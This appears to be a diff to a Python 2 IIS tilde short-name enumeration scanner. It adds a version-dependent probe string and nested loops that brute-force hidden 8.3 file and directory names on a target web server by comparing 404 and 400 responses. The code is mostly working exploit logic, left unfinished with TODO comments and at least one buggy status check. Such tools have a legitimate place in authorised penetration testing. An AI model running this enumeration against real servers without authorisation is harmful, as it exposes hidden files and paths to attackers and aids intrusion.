@@ -140,7 +140,12 @@ def main():
 	server_header = getWebServerResponse(args.url)
 	if 'IIS' in server_header.headers['server'] or 'icrosoft' in server_header.headers['server']:
 		print bcolors.GREEN + '[+]  The server is reporting that it is IIS (%s).' % server_header.headers['server'] + bcolors.ENDC
-		# TODO - Figure out which version of IIS
+		if '5.' in server_header.headers['server']:
+			check_string = '*~1*'
+		elif '6.' in server_header.headers['server']:
+			check_string = '*~1*/.aspx'
+		else:
+			check_string = '0x00000000'
 	else:
 		print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS (%s).\n[!]     If you know it is, use the -f flag to force testing and re-run the script.' % server_header + bcolors.ENDC
 		sys.exit()
@@ -156,16 +161,50 @@ def main():
 		print bcolors.RED + '[!]  Error. Server is not probably NOT vulnerable to the tilde enumeration vulnerability.\n[!]     If you know it is, use the -f flag to force testing and re-run the script.' + bcolors.ENDC
 		sys.exit()
 
+	url = urlparse(args.url)
+	url_good = url.scheme + '://' + url.netloc
 
-	# Now we need to go through the char[] and try them and find files and dirs.
+	# Here is where we find the files and dirs using the 404 and 400 errors
+	for char in chars:
+		resp = getWebServerResponse(url_good+'/'+char+check_string)
+		if resp.code == 404:  # Got the first valid char
 
+			# TODO - We are not getting the names < 6 chars
+			# TODO - Check to see how big the word is
+			resp_len = getWebServerResponse(url_good+'/'+char+'%3f'+check_string)
+			if resp_len == 404:
+				print 'continuing'
+			else:
+				print url_good+'/'+char+'%3f'+check_string, resp_len.code
 
+			# STOPPED HERE...GOTTA FIGURE OUT A WAY TO DO FILES AND DIRS < 6 CHARS
+			for char2 in chars:
+				resp2 = getWebServerResponse(url_good+'/'+char+char2+check_string)
 
+				if resp2.code == 404:  # Got the second valid char
+					for char3 in chars:
+						resp3 = getWebServerResponse(url_good+'/'+char+char2+char3+check_string)
 
+						if resp3.code == 404:  # Got the third valid char
+							for char4 in chars:
+								resp4 = getWebServerResponse(url_good+'/'+char+char2+char3+char4+check_string)
 
+								if resp4.code == 404:  # Got the fourth valid char
+									for char5 in chars:
+										resp5 = getWebServerResponse(url_good+'/'+char+char2+char3+char4+char5+check_string)
 
+										if resp5.code == 404:  # Got the fifth valid char
+											for char6 in chars:
+												resp6 = getWebServerResponse(url_good+'/'+char+char2+char3+char4+char5+char6+check_string)
 
-
+												if resp6.code == 404:  # Got the sixth valid char
+													findings.append(char+char2+char3+char4+char5+char6)
+													#print url_good+'/'+char+char2+char3+char4+char5+char6+check_string # debug
+				#else:
+				#	print '2 char = ' +url_good+'/'+char+char2
+		#else:
+		#	print '1 char = ' +url_good+'/'+char
+	print findings
 	# Start the URL requests to the server
 	print bcolors.GREEN + '[-]  Now starting the web calls' + bcolors.ENDC
 
